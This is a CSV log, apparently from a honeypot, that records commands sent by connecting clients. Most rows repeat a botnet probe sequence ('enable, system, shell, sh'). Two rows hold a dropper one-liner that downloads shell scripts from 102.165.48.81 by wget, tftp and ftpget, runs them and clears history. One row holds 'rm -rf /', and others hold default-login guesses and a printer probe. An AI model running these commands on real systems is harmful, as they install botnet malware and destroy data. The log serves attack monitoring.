id,command,connection_id
10100,enable,93677
10101,system,93677
10102,shell,93677
10103,sh,93677
10104,enable,93678
10105,system,93678
10106,shell,93678
10107,sh,93678
10108,enable,93683
10109,system,93683
10110,shell,93683
10111,sh,93683
10112,enable,93697
10113,system,93697
10114,shell,93697
10115,sh,93697
10116,enable,93725
10117,system,93725
10118,shell,93725
10119,sh,93725
10120,enable,93744
10121,system,93744
10122,shell,93744
10123,sh,93744
10124,enable,93890
10125,system,93890
10126,shell,93890
10127,sh,93890
10128,enable,93913
10129,system,93913
10130,shell,93913
10131,sh,93913
10132,enable,93951
10133,system,93951
10134,shell,93951
10135,sh,93951
10136,enable,94140
10137,system,94140
10138,shell,94140
10139,sh,94140
10140,enable,94174
10141,system,94174
10142,shell,94174
10143,sh,94174
10144,enable,94215
10145,system,94215
10146,shell,94215
10147,sh,94215
10148,enable,94232
10149,system,94232
10150,shell,94232
10151,sh,94232
10152,enable,94242
10153,system,94242
10154,shell,94242
10155,sh,94242
10156,enable,94248
10157,system,94248
10158,shell,94248
10159,sh,94248
10160,enable,94249
10161,system,94249
10162,shell,94249
10163,sh,94249
10164,enable,94250
10165,system,94250
10166,shell,94250
10167,sh,94250
10168,enable,94251
10169,system,94251
10170,shell,94251
10171,sh,94251
10172,enable,94253
10173,system,94253
10174,shell,94253
10175,sh,94253
10176,enable,94258
10177,system,94258
10178,shell,94258
10179,sh,94258
10180,enable,94259
10181,system,94259
10182,shell,94259
10183,sh,94259
10184,sh,94271
10185,shell,94271
10186,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",94271
10187,sh,94271
10188,enable,94275
10189,system,94275
10190,shell,94275
10191,sh,94275
10192,enable,94293
10193,system,94293
10194,shell,94293
10195,sh,94293
10196,enable,94294
10197,system,94294
10198,shell,94294
10199,sh,94294
10200,enable,94308
10201,system,94308
10202,shell,94308
10203,sh,94308
10204,enable,94313
10205,system,94313
10206,shell,94313
10207,sh,94313
10208,enable,94318
10209,system,94318
10210,shell,94318
10211,sh,94318
10212,enable,94358
10213,system,94358
10214,shell,94358
10215,sh,94358
10216,enable,94372
10217,system,94372
10218,shell,94372
10219,sh,94372
10220,enable,94392
10221,system,94392
10222,shell,94392
10223,sh,94392
10224,enable,94403
10225,system,94403
10226,shell,94403
10227,sh,94403
10228,enable,94428
10229,system,94428
10230,shell,94428
10231,sh,94428
10232,ls,94432
10233,"rm -rf /",94432
10234,enable,94434
10235,system,94434
10236,shell,94434
10237,sh,94434
10238,enable,94435
10239,system,94435
10240,shell,94435
10241,sh,94435
10242,root,94442
10243,system,94442
10244,admin,94442
10245,smcadmin,94442
10246,enable,94443
10247,system,94443
10248,shell,94443
10249,sh,94443
10250,enable,94483
10251,system,94483
10252,shell,94483
10253,sh,94483
10254,enable,94497
10255,system,94497
10256,shell,94497
10257,sh,94497
10258,enable,94508
10259,system,94508
10260,shell,94508
10261,sh,94508
10262,enable,94511
10263,system,94511
10264,shell,94511
10265,sh,94511
10266,enable,94512
10267,system,94512
10268,shell,94512
10269,sh,94512
10270,enable,94514
10271,system,94514
10272,shell,94514
10273,sh,94514
10274,enable,94527
10275,system,94527
10276,shell,94527
10277,sh,94527
10278,enable,94580
10279,system,94580
10280,shell,94580
10281,sh,94580
10282,enable,94719
10283,system,94719
10284,shell,94719
10285,sh,94719
10286,enable,94760
10287,system,94760
10288,shell,94760
10289,sh,94760
10290,enable,94761
10291,system,94761
10292,shell,94761
10293,sh,94761
10294,enable,94762
10295,system,94762
10296,shell,94762
10297,sh,94762
10298,enable,94784
10299,system,94784
10300,shell,94784
10301,sh,94784
10302,enable,94833
10303,system,94833
10304,shell,94833
10305,sh,94833
10306,enable,94834
10307,system,94834
10308,shell,94834
10309,sh,94834
10310,enable,94845
10311,system,94845
10312,shell,94845
10313,sh,94845
10314,enable,94873
10315,system,94873
10316,shell,94873
10317,sh,94873
10318,enable,94883
10319,system,94883
10320,shell,94883
10321,sh,94883
10322,enable,94885
10323,system,94885
10324,shell,94885
10325,sh,94885
10326,enable,94896
10327,system,94896
10328,shell,94896
10329,sh,94896
10330,enable,94915
10331,system,94915
10332,shell,94915
10333,sh,94915
10334,sh,94917
10335,shell,94917
10336,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",94917
10337,sh,94917
10338,enable,94930
10339,system,94930
10340,shell,94930
10341,sh,94930
10342,enable,94932
10343,system,94932
10344,shell,94932
10345,sh,94932
10346,enable,94939
10347,system,94939
10348,shell,94939
10349,sh,94939
10350,enable,94955
10351,system,94955
10352,shell,94955
10353,sh,94955
10354,enable,94965
10355,system,94965
10356,shell,94965
10357,sh,94965
10358,enable,95056
10359,system,95056
10360,shell,95056
10361,sh,95056
10362,enable,95083
10363,system,95083
10364,shell,95083
10365,sh,95083
10366,enable,95096
10367,system,95096
10368,shell,95096
10369,sh,95096
10370,enable,95113
10371,system,95113
10372,shell,95113
10373,sh,95113
10374,enable,95117
10375,system,95117
10376,shell,95117
10377,sh,95117
10378,enable,95142
10379,system,95142
10380,shell,95142
10381,sh,95142
10382,enable,95184
10383,system,95184
10384,shell,95184
10385,sh,95184
10386,enable,95199
10387,enable,95200
10388,enable,95201
10389,system,95199
10390,system,95200
10391,system,95201
10392,shell,95200
10393,shell,95199
10394,shell,95201
10395,sh,95200
10396,sh,95199
10397,sh,95201
10398,enable,95204
10399,system,95204
10400,shell,95204
10401,sh,95204
10402,enable,95220
10403,system,95220
10404,shell,95220
10405,sh,95220
10406,enable,95244
10407,system,95244
10408,shell,95244
10409,sh,95244
10410,enable,95248
10411,system,95248
10412,shell,95248
10413,sh,95248
10414,enable,95261
10415,system,95261
10416,shell,95261
10417,sh,95261
10418,enable,95280
10419,system,95280
10420,shell,95280
10421,sh,95280
10422,enable,95281
10423,system,95281
10424,shell,95281
10425,sh,95281
10426,enable,95323
10427,system,95323
10428,shell,95323
10429,sh,95323
10430,enable,95340
10431,system,95340
10432,shell,95340
10433,sh,95340
10434,enable,95383
10435,system,95383
10436,shell,95383
10437,sh,95383
10438,enable,95390
10439,system,95390
10440,shell,95390
10441,sh,95390
10442,enable,95403
10443,system,95403
10444,shell,95403
10445,sh,95403
10446,enable,95410
10447,system,95410
10448,shell,95410
10449,sh,95410
10450,enable,95432
10451,system,95432
10452,shell,95432
10453,sh,95432
10454,enable,95434
10455,system,95434
10456,shell,95434
10457,sh,95434
10458,enable,95461
10459,system,95461
10460,shell,95461
10461,sh,95461
10462,enable,95537
10463,system,95537
10464,shell,95537
10465,sh,95537
10466,enable,95606
10467,system,95606
10468,shell,95606
10469,sh,95606
10470,enable,95684
10471,system,95684
10472,shell,95684
10473,sh,95684
10474,"%-12345X@PJL INFO ID",95699
10475,"%-12345X",95699
10476,enable,95700
10477,system,95700
10478,shell,95700
10479,sh,95700
10480,enable,95702
10481,system,95702
10482,shell,95702
10483,sh,95702
10484,enable,95715
10485,system,95715
10486,shell,95715
10487,sh,95715
10488,enable,95716
10489,system,95716
10490,shell,95716
10491,sh,95716
10492,enable,95732
10493,system,95732
10494,shell,95732
10495,sh,95732
10496,enable,95809
10497,system,95809
10498,shell,95809
10499,sh,95809
10500,enable,96082
10501,system,96082
10502,shell,96082
10503,sh,96082
10504,enable,96086
10505,system,96086
10506,shell,96086
10507,sh,96086
10508,enable,96101
10509,system,96101
10510,shell,96101
10511,sh,96101
10512,enable,96104
10513,system,96104
10514,shell,96104
10515,sh,96104
10516,enable,96109
10517,system,96109
10518,shell,96109
10519,sh,96109
10520,enable,96110
10521,system,96110
10522,shell,96110
10523,sh,96110
10524,enable,96121
10525,system,96121
10526,shell,96121
10527,sh,96121
10528,enable,96134
10529,system,96134
10530,shell,96134
10531,sh,96134
10532,enable,96135
10533,system,96135
10534,shell,96135
10535,sh,96135
10536,enable,96136
10537,system,96136
10538,shell,96136
10539,sh,96136
10540,enable,96146
10541,system,96146
10542,shell,96146
10543,sh,96146
10544,enable,96238
10545,system,96238
10546,shell,96238
10547,sh,96238
10548,enable,96290
10549,system,96290
10550,shell,96290
10551,sh,96290
10552,enable,96295
10553,system,96295
10554,shell,96295
10555,sh,96295
10556,enable,96309
10557,system,96309
10558,shell,96309
10559,sh,96309
10560,enable,96314
10561,system,96314
10562,shell,96314
10563,sh,96314
10564,enable,96315
10565,system,96315
10566,shell,96315
10567,sh,96315
10568,enable,96389
10569,system,96389
10570,shell,96389
10571,sh,96389
10572,enable,96426
10573,system,96426
10574,shell,96426
10575,sh,96426
10576,enable,96427
10577,system,96427
10578,shell,96427
10579,sh,96427
10580,enable,96434
10581,system,96434
10582,shell,96434
10583,sh,96434
10584,enable,96436
10585,system,96436
10586,shell,96436
10587,sh,96436
10588,enable,96472
10589,system,96472
10590,shell,96472
10591,sh,96472
10592,enable,96491
10593,system,96491
10594,shell,96491
10595,sh,96491
10596,enable,96532
10597,system,96532
10598,shell,96532
10599,sh,96532
10600,enable,96534
10601,system,96534
10602,shell,96534
10603,sh,96534
10604,enable,96535
10605,system,96535
10606,shell,96535
10607,sh,96535
10608,enable,96558
10609,system,96558
10610,shell,96558
10611,sh,96558
10612,enable,96561
10613,system,96561
10614,shell,96561
10615,sh,96561
10616,enable,96566
10617,system,96566
10618,shell,96566
10619,sh,96566
10620,enable,96579
10621,system,96579
10622,shell,96579
10623,sh,96579
10624,enable,96585
10625,system,96585
10626,shell,96585
10627,sh,96585
10628,enable,96586
10629,system,96586
10630,shell,96586
10631,sh,96586
10632,enable,96610
10633,system,96610
10634,shell,96610
10635,sh,96610
10636,enable,96630
10637,system,96630
10638,shell,96630
10639,sh,96630
10640,enable,96723
10641,system,96723
10642,shell,96723
10643,sh,96723
10644,enable,96743
10645,system,96743
10646,shell,96743
10647,sh,96743
10648,enable,96782
10649,system,96782
10650,shell,96782
10651,sh,96782
10652,enable,96786
10653,system,96786
10654,shell,96786
10655,sh,96786
10656,enable,96815
10657,system,96815
10658,shell,96815
10659,sh,96815
10660,enable,96855
10661,system,96855
10662,shell,96855
10663,sh,96855
10664,enable,96857
10665,system,96857
10666,shell,96857
10667,sh,96857
10668,enable,96918
10669,system,96918
10670,shell,96918
10671,sh,96918
10672,enable,96947
10673,system,96947
10674,shell,96947
10675,sh,96947
10676,enable,96950
10677,system,96950
10678,shell,96950
10679,sh,96950
10680,enable,97059
10681,system,97059
10682,shell,97059
10683,sh,97059
10684,enable,97198
10685,system,97198
10686,shell,97198
10687,sh,97198
10688,enable,97203
10689,system,97203
10690,shell,97203
10691,sh,97203
10692,enable,97215
10693,system,97215
10694,shell,97215
10695,sh,97215
10696,enable,97568
10697,system,97568
10698,shell,97568
10699,sh,97568
10700,enable,97575
10701,system,97575
10702,shell,97575
10703,sh,97575
10704,enable,97576
10705,system,97576
10706,shell,97576
10707,sh,97576
10708,enable,97577
10709,system,97577
10710,shell,97577
10711,sh,97577
10712,enable,97578
10713,system,97578
10714,shell,97578
10715,sh,97578
10716,enable,97580
10717,system,97580
10718,shell,97580
10719,sh,97580
10720,enable,97596
10721,system,97596
10722,shell,97596
10723,sh,97596
10724,enable,97599
10725,system,97599
10726,shell,97599
10727,sh,97599
10728,sh,97627
10729,shell,97627
10730,enable,97674
10731,system,97674
10732,shell,97674
10733,sh,97674
10734,enable,97680
10735,system,97680
10736,shell,97680
10737,sh,97680
10738,enable,97701
10739,system,97701
10740,shell,97701
10741,sh,97701
10742,enable,97717
10743,system,97717
10744,shell,97717
10745,sh,97717
10746,enable,97718
10747,system,97718
10748,shell,97718
10749,sh,97718
10750,enable,97744
10751,system,97744
10752,shell,97744
10753,sh,97744
10754,enable,97745
10755,system,97745
10756,shell,97745
10757,sh,97745
10758,enable,97765
10759,system,97765
10760,shell,97765
10761,sh,97765
10762,enable,97789
10763,system,97789
10764,shell,97789
10765,sh,97789
10766,enable,97791
10767,system,97791
10768,shell,97791
10769,sh,97791
10770,enable,97812
10771,system,97812
10772,shell,97812
10773,sh,97812
10774,enable,97819
10775,system,97819
10776,shell,97819
10777,sh,97819
10778,enable,97823
10779,system,97823
10780,shell,97823
10781,sh,97823
10782,enable,97827
10783,system,97827
10784,shell,97827
10785,sh,97827
10786,enable,97828
10787,system,97828
10788,shell,97828
10789,sh,97828
10790,enable,97873
10791,system,97873
10792,shell,97873
10793,sh,97873
10794,enable,97878
10795,system,97878
10796,shell,97878
10797,sh,97878
10798,enable,97888
10799,system,97888
10800,shell,97888
10801,sh,97888
10802,enable,98019
10803,system,98019
10804,shell,98019
10805,sh,98019
10806,enable,98020
10807,system,98020
10808,shell,98020
10809,sh,98020
10810,enable,98021
10811,system,98021
10812,shell,98021
10813,sh,98021
10814,enable,98022
10815,system,98022
10816,shell,98022
10817,sh,98022
10818,enable,98059
10819,system,98059
10820,shell,98059
10821,sh,98059
10822,enable,98082
10823,system,98082
10824,shell,98082
10825,sh,98082
10826,enable,98083
10827,system,98083
10828,shell,98083
10829,sh,98083
10830,enable,98084
10831,system,98084
10832,shell,98084
10833,sh,98084
10834,enable,98192
10835,system,98192
10836,shell,98192
10837,sh,98192
10838,enable,98228
10839,system,98228
10840,shell,98228
10841,sh,98228
10842,enable,98285
10843,system,98285
10844,shell,98285
10845,sh,98285
10846,enable,98286
10847,system,98286
10848,shell,98286
10849,sh,98286
10850,enable,98294
10851,system,98294
10852,shell,98294
10853,sh,98294
10854,enable,98295
10855,system,98295
10856,shell,98295
10857,sh,98295
10858,enable,98296
10859,system,98296
10860,shell,98296
10861,sh,98296
10862,enable,98331
10863,system,98331
10864,shell,98331
10865,sh,98331
10866,enable,98343
10867,system,98343
10868,shell,98343
10869,sh,98343
10870,enable,98346
10871,system,98346
10872,shell,98346
10873,sh,98346
10874,enable,98348
10875,system,98348
10876,shell,98348
10877,sh,98348
10878,enable,98349
10879,system,98349
10880,shell,98349
10881,sh,98349
10882,enable,98371
10883,system,98371
10884,shell,98371
10885,sh,98371
10886,enable,98706
10887,system,98706
10888,shell,98706
10889,sh,98706
10890,enable,98774
10891,system,98774
10892,shell,98774
10893,sh,98774
10894,enable,98800
10895,system,98800
10896,shell,98800
10897,sh,98800
10898,enable,98836
10899,system,98836
10900,shell,98836
10901,sh,98836
10902,enable,98839
10903,system,98839
10904,shell,98839
10905,sh,98839
10906,enable,98840
10907,system,98840
10908,shell,98840
10909,sh,98840
10910,enable,98863
10911,system,98863
10912,shell,98863
10913,sh,98863
10914,enable,98890
10915,system,98890
10916,shell,98890
10917,sh,98890
10918,enable,98896
10919,system,98896
10920,shell,98896
10921,sh,98896
10922,sh,98908
10923,shell,98908
10924,sh,98910
10925,shell,98910
10926,sh,98911
10927,shell,98911
10928,sh,98912
10929,shell,98912
10930,sh,98914
10931,shell,98914
10932,sh,98915
10933,shell,98915
10934,sh,98916
10935,shell,98916
10936,sh,98917
10937,shell,98917
10938,sh,98918
10939,shell,98918
10940,sh,98919
10941,sh,98920
10942,shell,98919
10943,sh,98921
10944,shell,98920
10945,sh,98922
10946,shell,98921
10947,sh,98923
10948,shell,98922
10949,sh,98924
10950,shell,98923
10951,sh,98925
10952,shell,98924
10953,sh,98926
10954,shell,98925
10955,shell,98926
10956,"ls /",98926
10957,sh,98927
10958,shell,98927
10959,"ls /",98927
10960,sh,98928
10961,shell,98928
10962,"ls /",98928
10963,sh,98929
10964,shell,98929
10965,"ls /",98929
10966,sh,98930
10967,shell,98930
10968,"ls /",98930
10969,sh,98931
10970,shell,98931
10971,"ls /",98931
10972,sh,98932
10973,shell,98932
10974,"ls /",98932
10975,sh,98933
10976,shell,98933
10977,"ls /",98933
10978,sh,98934
10979,shell,98934
10980,"ls /",98934
10981,sh,98935
10982,shell,98935
10983,"ls /",98935
10984,sh,98936
10985,shell,98936
10986,"ls /",98936
10987,sh,98937
10988,shell,98937
10989,"ls /",98937
10990,sh,98938
10991,shell,98938
10992,"ls /",98938
10993,sh,98939
10994,shell,98939
10995,"ls /",98939
10996,sh,98940
10997,shell,98940
10998,"ls /",98940
10999,sh,98941
11000,shell,98941
11001,"ls /",98941
11002,sh,98942
11003,shell,98942
